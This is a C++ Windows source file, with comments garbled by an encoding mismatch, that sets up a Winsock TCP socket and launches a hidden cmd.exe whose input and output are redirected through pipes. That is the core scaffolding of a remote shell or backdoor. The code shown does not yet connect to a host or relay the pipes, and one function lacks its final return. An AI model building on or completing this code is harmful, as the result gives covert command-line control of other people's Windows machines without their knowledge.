#include "function.h"
#include "stdafx.h"
//ͷ�ļ�
#include <winsock2.h>
#include <thread>
#include "windows.h"
#include<iostream>
using namespace std;
//����ͨ�ŵ�ͷ�ļ��Ϳ�

//���ļ�
#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS
//windows������ ����Ҫ��������api��������ĳ�ʼ���ͷ���ʼ��
SOCKET s;
HANDLE hWritePipe; //д�˿�
HANDLE hCmdReadPipe; //cmd���˿�

HANDLE hReadPipe; //���˿�
HANDLE hCmdWritePipe; //cmdд�˿�

void InitSocket() {
	
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	//��ʼ������

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {

		cout << "��ʼ���׽��ֿ�ʧ�ܣ�" << endl;
	}
	else {
		cout << "��ʼ���׽��ֿ�ɹ���" << endl;
	}


	//1.socket  ����һ���׽���
	s = socket(
		AF_INET,//INETЭ���
		SOCK_STREAM,//��ʾʹ�õ�ʹTCPЭ��
		0);

	if (s == INVALID_SOCKET) {
		cout << "�����׽��ֿ�ʧ�ܣ�" << endl;
		WSACleanup();
	}
	else {
		cout << "�����׽��ֿ�ʧ�ܳɹ���" << endl;
	}
}
int InitCmd() {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	SECURITY_ATTRIBUTES Sa = { 0 };
	Sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	Sa.bInheritHandle = TRUE;

	BOOL bRet = CreatePipe(&hCmdReadPipe, &hWritePipe, &Sa, 0);


	if (!bRet) {
		printf("create pipe error ");
		return 0;

	}


	bRet = CreatePipe(&hReadPipe, &hCmdWritePipe, &Sa, 0);


	if (!bRet) {
		printf("create pipe error ");
		return 0;

	}


	//�滻cmd��׼�������
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES; //��־λ ��������滻�ı�־
	si.hStdInput = hCmdReadPipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdError = hCmdWritePipe;

	bRet = CreateProcess(
		_T("C:\\Windows\\System32\\cmd.exe"), //��һ������ ���������г���·��
		NULL, //�����в��� (����Ϊ����)��_T("/c calc")�����м�����
		NULL, //���̾���̳�����
		NULL, //�߳̾���̳�����
		TRUE, //�̳п���
		CREATE_NO_WINDOW, //�޴���    OD��������DEBUG_PROCESS��
		NULL, //��������
		NULL, //��ǰ·�� ����˫������ʱ��·�� �����·����
		&si, //��������
		&pi  //��������	

	);
	if (!bRet) {
		printf("create process error ");
		return 0;

	}


}